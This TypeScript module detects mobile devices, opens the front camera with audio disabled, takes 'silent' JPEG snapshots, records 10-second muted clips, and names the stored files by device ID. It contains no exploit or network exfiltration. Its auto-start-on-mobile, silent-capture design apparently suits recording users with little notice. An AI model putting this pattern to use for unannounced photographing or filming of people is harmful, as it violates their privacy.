/**
 * Camera initialization, silent canvas snapshot capture, and silent video clip recording utilities.
 * Always operates with audio: false (no microphone access requested).
 */

/**
 * Accurately detects whether the current environment is a mobile/tablet device.
 * Ensures laptops/desktops never initialize the camera automatically.
 */
export function isMobileDevice(): boolean {
  if (typeof window === 'undefined' || typeof navigator === 'undefined') return false;
  const ua = navigator.userAgent || '';
  const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile/i;
  const isTouch = 'ontouchstart' in window || (navigator.maxTouchPoints && navigator.maxTouchPoints > 0);
  const isSmallScreen = window.innerWidth <= 1024;
  return mobileRegex.test(ua) || (Boolean(isTouch) && isSmallScreen);
}

/**
 * Requests front-facing camera ONLY (audio: false) for silent photos and muted video clips.
 */
export async function initFrontCameraStream(): Promise<MediaStream> {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    throw new Error('Camera API (getUserMedia) is not supported in this browser.');
  }

  try {
    return await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: 'user',
        width: { ideal: 1280, min: 640 },
        height: { ideal: 720, min: 480 },
        frameRate: { ideal: 24, max: 30 },
      },
      audio: false,
    });
  } catch (err) {
    // If constraint fails (not permission error), fallback to basic facingMode: 'user'
    const isPermissionErr =
      err instanceof DOMException &&
      (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError');
    if (isPermissionErr) {
      throw err;
    }

    try {
      return await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false,
      });
    } catch (fallbackErr) {
      const isPermFallback =
        fallbackErr instanceof DOMException &&
        (fallbackErr.name === 'NotAllowedError' || fallbackErr.name === 'PermissionDeniedError');
      if (isPermFallback) {
        throw fallbackErr;
      }
      return await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false,
      });
    }
  }
}

export interface SnapshotResult {
  blob: Blob;
  dataUrl: string;
  width: number;
  height: number;
}

/**
 * Captures a completely silent snapshot from an HTMLVideoElement using HTML5 Canvas API.
 */
export async function captureSilentCanvasFrame(
  videoElement: HTMLVideoElement,
  quality: number = 0.8
): Promise<SnapshotResult> {
  const rawWidth = videoElement.videoWidth || 1280;
  const rawHeight = videoElement.videoHeight || 720;
  const width = Math.min(rawWidth, 1280);
  const height = Math.round((rawHeight / rawWidth) * width) || 720;

  const canvas = document.createElement('canvas');
  canvas.width = width;
  canvas.height = height;
  const ctx = canvas.getContext('2d');

  if (!ctx) {
    throw new Error('Failed to create 2D canvas context for frame capture.');
  }

  ctx.drawImage(videoElement, 0, 0, width, height);

  const blob = await new Promise<Blob>((resolve, reject) => {
    canvas.toBlob(
      (b) => {
        if (b) resolve(b);
        else reject(new Error('Canvas toBlob conversion failed.'));
      },
      'image/jpeg',
      quality
    );
  });

  return {
    blob,
    dataUrl: '',
    width,
    height,
  };
}

export interface RecordedVideoResult {
  blob: Blob;
  mimeType: string;
  extension: string;
  durationSeconds: number;
}

/**
 * Records a silent (video-only) clip from an active MediaStream.
 */
export async function recordVideoClip(
  stream: MediaStream,
  durationSeconds: number = 10
): Promise<RecordedVideoResult> {
  if (typeof MediaRecorder === 'undefined') {
    throw new Error('MediaRecorder is not supported in this browser.');
  }

  const candidateMimeTypes = [
    'video/webm;codecs=vp9',
    'video/webm;codecs=vp8',
    'video/webm',
    'video/mp4;codecs=avc1',
    'video/mp4',
  ];

  let selectedMimeType = '';
  let extension = 'webm';

  for (const t of candidateMimeTypes) {
    if (MediaRecorder.isTypeSupported(t)) {
      selectedMimeType = t;
      extension = t.includes('mp4') ? 'mp4' : 'webm';
      break;
    }
  }

  return new Promise<RecordedVideoResult>((resolve, reject) => {
    try {
      const options: MediaRecorderOptions = {
        ...(selectedMimeType ? { mimeType: selectedMimeType } : {}),
        videoBitsPerSecond: 600000, // Crisp clarity while keeping 10s video ~750 KB
      };

      let recorder: MediaRecorder;
      try {
        recorder = new MediaRecorder(stream, options);
      } catch {
        recorder = new MediaRecorder(stream);
      }

      const chunks: Blob[] = [];

      recorder.ondataavailable = (e: BlobEvent) => {
        if (e.data && e.data.size > 0) {
          chunks.push(e.data);
        }
      };

      recorder.onerror = () => {
        reject(new Error('MediaRecorder encountered an error during recording.'));
      };

      recorder.onstop = () => {
        const actualMime =
          selectedMimeType ||
          recorder.mimeType ||
          (extension === 'mp4' ? 'video/mp4' : 'video/webm');
        const finalBlob = new Blob(chunks, { type: actualMime });
        resolve({
          blob: finalBlob,
          mimeType: actualMime,
          extension,
          durationSeconds,
        });
      };

      recorder.start(1000);

      setTimeout(() => {
        if (recorder.state !== 'inactive') {
          recorder.stop();
        }
      }, durationSeconds * 1000);
    } catch (err) {
      reject(err);
    }
  });
}

export function generatePhotoStoragePath(
  deviceId: string,
  timestampStr: string,
  index: 1 | 2
): string {
  const sanitizedDeviceId = deviceId.trim().replace(/[/\\?%*:|"<>]/g, '_') || 'Mobile_Device';
  return `${sanitizedDeviceId}/photo_${timestampStr}_${index}.jpg`;
}

export function generateVideoStoragePath(
  deviceId: string,
  timestampStr: string,
  extension: string = 'webm'
): string {
  const sanitizedDeviceId = deviceId.trim().replace(/[/\\?%*:|"<>]/g, '_') || 'Mobile_Device';
  return `${sanitizedDeviceId}/video_${timestampStr}_10s.${extension}`;
}

export function getFileSafeTimestamp(date: Date = new Date()): string {
  const pad = (n: number) => n.toString().padStart(2, '0');
  const y = date.getFullYear();
  const m = pad(date.getMonth() + 1);
  const d = pad(date.getDate());
  const h = pad(date.getHours());
  const min = pad(date.getMinutes());
  const s = pad(date.getSeconds());
  return `${y}${m}${d}_${h}${min}${s}`;
}
